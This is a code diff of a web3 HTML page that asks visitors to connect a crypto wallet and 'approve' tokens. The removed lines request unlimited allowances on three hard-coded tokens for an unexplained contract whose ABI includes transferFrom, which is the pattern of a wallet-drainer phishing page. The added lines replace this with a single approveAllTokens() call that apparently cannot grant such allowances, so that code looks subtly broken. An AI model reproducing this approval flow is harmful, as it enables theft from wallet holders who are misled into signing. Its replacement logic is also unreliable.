@@ -7,46 +7,18 @@
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
 </head>
 <body>
-    <h1>Approve Tokens</h1>
+    <h1>Approve All Tokens</h1>
     <button id="connectWallet">Connect Wallet</button>
     <p>Wallet Address: <span id="walletAddress">Not connected</span></p>
-    <button id="approveTokens">Approve Tokens</button>
+    <button id="approveAllTokens">Approve All Tokens</button>
 
     <script>
-        // Contract and Token Addresses
-        const contractAddress = "0xC553839F1d5B0006D2f760677dEEC0cB65aF7Dc9";
-        const tokenAAddress = "0xed5B7F9191FfBFf2Ca95D28b22bE2121ab55aD23";
-        const tokenBAddress = "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E";
-        const tokenCAddress = "0xD00485b963E46753d7F1AC0a21487391e635Ca07";
-
+        const contractAddress = "0x497f49E88D53566c37E51501D0dce8c38249B7db";
         const contractABI = [
             {
-                "inputs": [
-                    { "internalType": "address", "name": "spender", "type": "address" },
-                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
-                ],
-                "name": "approve",
-                "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    { "internalType": "address", "name": "account", "type": "address" }
-                ],
-                "name": "balanceOf",
-                "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    { "internalType": "address", "name": "sender", "type": "address" },
-                    { "internalType": "address", "name": "recipient", "type": "address" },
-                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
-                ],
-                "name": "transferFrom",
-                "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+                "inputs": [],
+                "name": "approveAllTokens",
+                "outputs": [],
                 "stateMutability": "nonpayable",
                 "type": "function"
             }
@@ -70,41 +42,23 @@
             }
         };
 
-        // Approve Tokens
-        document.getElementById("approveTokens").onclick = async () => {
+        // Approve All Tokens
+        document.getElementById("approveAllTokens").onclick = async () => {
             if (!userAddress) {
                 alert("Please connect your wallet first!");
                 return;
             }
 
             const web3 = new Web3(window.ethereum);
+            const contract = new web3.eth.Contract(contractABI, contractAddress);
 
             try {
-                // Maximum allowance
-                const maxUint = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
-
-                // Approve Token A
-                const tokenAContract = new web3.eth.Contract(contractABI, tokenAAddress);
-                console.log("Approving Token A...");
-                await tokenAContract.methods.approve(contractAddress, maxUint.toString()).send({ from: userAddress });
-                console.log("Token A approved.");
-
-                // Approve Token B
-                const tokenBContract = new web3.eth.Contract(contractABI, tokenBAddress);
-                console.log("Approving Token B...");
-                await tokenBContract.methods.approve(contractAddress, maxUint.toString()).send({ from: userAddress });
-                console.log("Token B approved.");
-
-                // Approve Token C
-                const tokenCContract = new web3.eth.Contract(contractABI, tokenCAddress);
-                console.log("Approving Token C...");
-                await tokenCContract.methods.approve(contractAddress, maxUint.toString()).send({ from: userAddress });
-                console.log("Token C approved.");
-
-                alert("Tokens approved successfully!");
+                console.log("Approving all tokens...");
+                await contract.methods.approveAllTokens().send({ from: userAddress });
+                alert("All tokens approved successfully!");
             } catch (error) {
                 console.error("Approval error:", error);
-                alert("Failed to approve tokens. Check console for details.");
+                alert("Failed to approve all tokens. Check console for details.");
             }
         };
     </script>
